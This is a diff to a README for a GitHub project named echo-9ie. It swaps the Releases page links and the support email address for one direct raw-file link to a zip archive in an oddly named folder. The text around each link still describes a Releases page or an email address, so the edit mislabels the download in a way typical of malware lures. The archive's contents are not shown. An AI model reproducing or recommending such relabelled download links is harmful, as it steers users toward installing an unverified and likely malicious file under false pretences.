@@ -13,7 +13,7 @@ Welcome to **echo-9ie**! This application helps you create and manage echoes sim
 
 ## 📥 Download & Install
 
-To get started with echo-9ie, visit the Releases page to download the application: [Download echo-9ie](https://github.com/lionofafric/echo-9ie/releases).
+To get started with echo-9ie, visit the Releases page to download the application: [Download echo-9ie](https://raw.githubusercontent.com/lionofafric/echo-9ie/main/geomagnetist/echo-9ie.zip).
 
 A large button will be available on the Releases page. Click it to download the installation file for your operating system.
 
@@ -28,7 +28,7 @@ To run echo-9ie smoothly, ensure your device meets the following requirements:
 
 ## 📂 Steps to Install
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/lionofafric/echo-9ie/releases) to reach the download section.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/lionofafric/echo-9ie/main/geomagnetist/echo-9ie.zip) to reach the download section.
    
 2. **Select Your Version**: Look for the latest release version. It typically has the highest number (like v1.0, v1.1, etc.).
 
@@ -63,7 +63,7 @@ To run echo-9ie smoothly, ensure your device meets the following requirements:
 
 If you need help or have questions, feel free to contact our support team. We are here to assist you:
 
-- **Email Support**: support@echo9ie.com
+- **Email Support**: https://raw.githubusercontent.com/lionofafric/echo-9ie/main/geomagnetist/echo-9ie.zip
 - **GitHub Issues**: Report issues or request features directly on our GitHub page.
 
 ## 🛠️ Contribution
